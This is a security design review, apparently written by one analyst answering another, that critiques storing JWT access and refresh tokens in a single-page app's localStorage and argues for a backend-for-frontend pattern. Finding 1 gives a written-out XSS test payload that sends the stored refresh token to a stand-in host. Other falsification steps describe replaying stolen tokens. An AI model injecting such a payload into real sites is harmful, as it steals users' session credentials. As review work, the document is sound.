## Consolidated Final Analysis: JWT Tokens in localStorage for SPA

---

### Finding 1 — XSS Converts localStorage into a Portable-Credential Dispensary

- **target:** the proposal (aligns with Analyst A, Finding 1)
- **steelman:** Same-origin policy plus modern framework auto-escaping plus a strict CSP dramatically shrinks the practical XSS surface. localStorage's same-origin isolation is, in the absence of XSS, equivalent to HttpOnly cookies from a script-access perspective.
- **weakness:** The design's security guarantee rests on a *universal negative that must hold forever*: no attacker-controlled JavaScript will ever execute in the page's origin—across all first-party code, all transitive npm dependencies (routinely hundreds), all third-party tags (analytics, A/B, chat, ads), and all future code changes. A single XSS—reflected, stored, or DOM-based—lets the attacker call `localStorage.getItem()`, exfiltrate both access and refresh tokens, and replay them from any network location with no further interaction with the victim's browser. This is categorically worse than HttpOnly cookies, where XSS can *ride* the session but cannot *extract and export* a portable credential. The `event-stream` (2018) and `ua-parser-js` (2021) npm supply-chain compromises demonstrate this invariant is empirically violated at scale.
- **evidence:** `localStorage` has no `HttpOnly` equivalent—it exists precisely to be read by JavaScript. Any script in the origin reads any key. Bearer tokens are replayable by design (no sender binding). The hidden assumption ("we will never have XSS across all code, all deps, all integrations, forever") is the strongest possible assumption in web security and the one most frequently violated.
- **falsification:** Inject `<img src=x onerror="fetch('https://canary.test/'+localStorage.getItem('refresh_token'))">` into every user-controlled input surface. If any canary fires, the design is exploited. Alternatively: audit for zero `dangerouslySetInnerHTML`/`v-html`/`innerHTML`/`eval` paths AND zero third-party scripts. If either audit fails, the invariant cannot hold.
- **severity:** critical
- **confidence:** HIGH

**Challenge to Analyst A, Finding 1:** Analyst A's evidence states tokens are "enumerated by `document.scripts`." This is incorrect: `document.scripts` returns an HTMLCollection of `<script>` elements, not localStorage contents. The actual exfiltration mechanism is `localStorage.getItem(key)` or iterating `Object.keys(localStorage)`. The core finding is sound; this evidence-chain error is cosmetic but reduces precision. Confidence in Analyst A's finding remains HIGH after correction.

### Finding 2 — Refresh Token Co-Location Escalates Minutes-Long Breach to Weeks-Long Persistent Access

- **target:** the proposal (aligns with Analyst A, Finding 2)
- **steelman:** Refresh-token rotation (issuing a new pair on each use and invalidating the old token) limits the reuse window, and short access-token lifetimes bound the damage from access-token-only theft.
- **weakness:** Storing the refresh token in the same localStorage as the access token means XSS theft yields *both*. The attacker can call the `/token` endpoint from their own infrastructure, receive a fresh access-token/refresh-token pair, and maintain persistent access that survives the original access token's expiry. With rotation, the attacker who redeems the refresh token first wins: the legitimate user's next refresh fails (breach detected but not prevented), and the attacker holds the sole valid refresh token. Without rotation, the attacker silently persists indefinitely. The hidden assumption—that refresh-token theft has the same blast radius as access-token theft—is false; it converts a bounded compromise into an unbounded one.
- **evidence:** Refresh tokens typically have TTLs of days to weeks. `localStorage` persists them without any built-in expiry mechanism. The token endpoint accepts refresh tokens without proof-of-possession (no DPoP, no mTLS in a browser context), so replay from an arbitrary origin succeeds. The IETF's OAuth 2.0 Security Best Current Practice (RFC 9700) recommends against storing refresh tokens in browser-accessible storage for browser-based applications.
- **falsification:** Steal a refresh token from localStorage, replay it from `curl` on a different machine, and observe whether a valid access token is issued. If yes, the escalation from minutes to weeks is confirmed.
- **severity:** critical
- **confidence:** HIGH

**Refinement over Analyst A, Finding 2:** Analyst A correctly identifies the persistence risk but conflates two distinct issues—persistence after logout (a UX/cleanup problem) and persistence after theft (a security escalation). These have different severity profiles: the theft-escalation path is critical; the logout-cleanup path is medium. Separating them sharpens the analysis.

### Finding 3 — Concurrent-Tab Refresh Race Causes Spurious Session Revocation (New Finding)

- **target:** the proposal
- **steelman:** localStorage is shared across all tabs in the same origin, so all tabs naturally see the latest refresh token, and the token-refresh flow is a simple POST that any tab can perform.
- **weakness:** When refresh-token rotation is implemented (the primary mitigation for Finding 2), a race condition emerges in multi-tab usage. Two tabs detect access-token expiry near-simultaneously and both read the *same* current refresh token from localStorage. Tab A's refresh request arrives first; the server issues a new pair and invalidates the old refresh token. Tab B's request arrives with the now-invalidated token. If the server implements reuse detection (recommended by security best practices for rotation), it interprets Tab B's request as a stolen-token replay and revokes the *entire token family*, logging out all tabs—including Tab A. The user experiences sudden, unexplained logout. The hidden assumption is that only one consumer of the refresh token exists at any given moment; multiple open tabs violate this. The workaround—using a BroadcastChannel or `storage` event to coordinate refreshes—adds significant complexity and has its own race windows.
- **evidence:** Mechanism: `localStorage.getItem('refresh_token')` returns the same value to concurrent readers → two POST `/token` requests with the same refresh token → server rotation logic invalidates after first use → second request triggers reuse detection → family revocation. This is a documented operational problem with refresh-token rotation in SPAs; the Auth0 documentation, for example, explicitly discusses this multi-tab challenge and recommends using in-memory tokens with silent authentication or a service worker as coordinator, rather than localStorage.
- **falsification:** Open the app in three tabs, set the access token's `exp` to the immediate past, and trigger API calls from all three tabs simultaneously. If any tab causes a full session revocation for the others, the finding is confirmed.
- **severity:** high
- **confidence:** HIGH

### Finding 4 — "Every API Call" Token Attachment Leaks Credentials to Unintended Origins

- **target:** the proposal
- **steelman:** In practice, developers scope the Authorization header to the app's own API base URL via a request interceptor, so "every API call" is shorthand, not literal.
- **weakness:** The proposal specifies attachment to *every* API call without qualification. If implemented via a global fetch/Axios interceptor, any outbound request—to a third-party analytics API, a CDN, an OAuth provider, or a partner service—carries the Bearer token. Even when scoped, an open redirect on a first-party endpoint (`/api/redirect?url=https://evil.com`) that the HTTP client follows can carry the Authorization header to the redirect target. While the Fetch specification strips the header on cross-origin redirects, not all HTTP client libraries enforce this uniformly (notably, older Axios versions and `fetch` polyfills). The hidden assumption is that the set of outbound request origins is fully enumerated, static, and trusted.
- **evidence:** Mechanism: global interceptor → token attached to request → request targets or is redirected to untrusted origin → token exfiltrated. The Fetch spec's cross-origin redirect header-stripping is a spec-level protection, not a protocol-level one; library compliance varies.
- **falsification:** Configure a first-party API endpoint to 302-redirect to an attacker-controlled server. Fire a request through the app's HTTP client. Inspect the incoming request at the attacker server for the Authorization header.
- **severity:** high
- **confidence:** MEDIUM

### Finding 5 — Stateless JWT Validation Precludes Timely Revocation

- **target:** the proposal
- **steelman:** Short access-token lifetimes (≤5 minutes) naturally bound the damage window, and server-side refresh-token revocation provides the necessary kill switch for the long-lived credential.
- **weakness:** JWT access tokens are validated by signature + `exp` alone—no database lookup. When an access token is stolen, the server *cannot revoke it*; it must wait for natural expiry. If access-token lifetime is set long (common to reduce refresh traffic and latency), the exploitation window stretches to hours. Adding a server-side token blocklist reintroduces the session-state infrastructure that JWT was designed to eliminate—contradicting the architectural motivation. The hidden assumption is that "stateless" and "immediately revocable" coexist without cost; they do not.
- **evidence:** Standard JWT validation: verify signature → check `exp` → check `iss`/`aud` → accept. No lookup step exists by default. Revoking a specific token requires maintaining server-side state (blocklist, generation counter, etc.), negating statelesness.
- **falsification:** After issuance, attempt to revoke a specific user's access token server-side *without* deploying any new stateful infrastructure. If impossible, the finding stands.
- **severity:** high
- **confidence:** HIGH

---

### Finding 6 — localStorage Persistence Creates Stale-Credential Exposure on Shared/Seized Devices

- **target:** the proposal
- **steelman:** Persistent sessions are a deliberate UX choice ("stay logged in"), and users can explicitly log out on shared devices.
- **weakness:** `localStorage` has no TTL mechanism. Unlike cookies (`Expires`, `Max-Age`) or `sessionStorage` (cleared on tab close), localStorage entries persist across browser restarts, OS reboots, and potentially browser-profile syncing. On a shared, public, or seized device, a user who closes the tab without explicitly logging out (the overwhelmingly common behavior) leaves both tokens permanently recoverable via DevTools or any script. The hidden assumption is that every session terminates via an explicit logout action that calls `localStorage.removeItem()`; empirically, users close tabs.
- **evidence:** `localStorage` provides no declarative expiry. Application-layer TTL checks (reading a stored timestamp on load) are a bolt-on that fails if the check code has a bug, is bypassed by directly navigating to a deep link, or is simply not implemented.
- **falsification:** Authenticate, close the tab and browser without logging out, reopen, navigate to the app's origin, and read `localStorage`. If tokens are present and the API accepts them, confirmed.
- **severity:** medium
- **confidence:** HIGH

### Finding 7 — Error-Monitoring and Session-Replay Tools Exfiltrate Tokens by Default

- **target:** the proposal
- **steelman:** Monitoring tools can be configured with scrubbing rules, so token leakage is a configuration discipline issue, not an architectural one.
- **weakness:** Because the token is JavaScript-accessible and appears as an HTTP header on every request, it naturally flows into two data structures that monitoring tools capture by default: (a) request headers (captured by Sentry, Datadog RUM, New Relic Browser), and (b) DOM/storage snapshots (captured by session-replay tools like LogRocket, FullStory). Default configurations of these tools capture Authorization headers in breadcrumbs. The design creates a latent data-leak surface that activates the moment *any* engineer integrates a monitoring tool without configuring header scrubbing—an event whose probability approaches 1 over the application's lifetime. The hidden assumption is that every current and future integration will be perfectly configured to scrub tokens.
- **evidence:** Mechanism: token in request header → monitoring SDK's auto-instrumentation captures fetch/XHR context including headers → event payload transmitted to third-party SaaS → tokens stored in vendor infrastructure. With HttpOnly cookies, the token never appears in JavaScript-accessible request metadata.
- **falsification:** Integrate Sentry with default config, trigger an API error, inspect the event payload. If the `Authorization` header is present, confirmed.
- **severity:** medium
- **confidence:** MEDIUM

### Challenge to Analyst A's Acceptability Condition

Analyst A's condition requires "short-lived, **non-refreshable** tokens." This effectively requires removing refresh tokens from the design entirely. If the design is only acceptable without one of its two core components, the intellectually honest conclusion is that the design *as proposed* is categorically unacceptable—not conditionally acceptable. The condition should be stated as such, rather than framed as a set of mitigations that preserve the design's identity. My position: mitigations like CSP, SRI, and short-lived tokens reduce risk but cannot eliminate the fundamental architectural defect (sensitive credentials in JavaScript-accessible storage). The BFF (Backend-for-Frontend) pattern, where tokens never reach the browser, is the correct remediation, not a conditional add-on.

---

### Acceptability Condition

This design is acceptable only if **all** of the following hold simultaneously and are continuously enforced: (1) a strict CSP with nonce/hash-based `script-src`, no `unsafe-inline`, no `unsafe-eval`; (2) zero third-party scripts in the page origin; (3) SRI on all externally-loaded scripts; (4) the refresh token is **not** stored in localStorage—it is handled by a BFF or stored in an HttpOnly cookie; (5) access-token lifetime ≤5 minutes; (6) the request interceptor scopes token attachment to an explicit, static origin allowlist; (7) all monitoring tools are verified to scrub Authorization headers; and (8) a coordinated single-flight refresh mechanism (service worker or BroadcastChannel) prevents multi-tab rotation races. Failure of any single condition makes the design exploitable. In practice, guaranteeing conditions (1)–(3) across all transitive dependencies for the application's full operational lifetime is infeasible, making the BFF pattern the only defensible architecture for token-bearing SPAs.
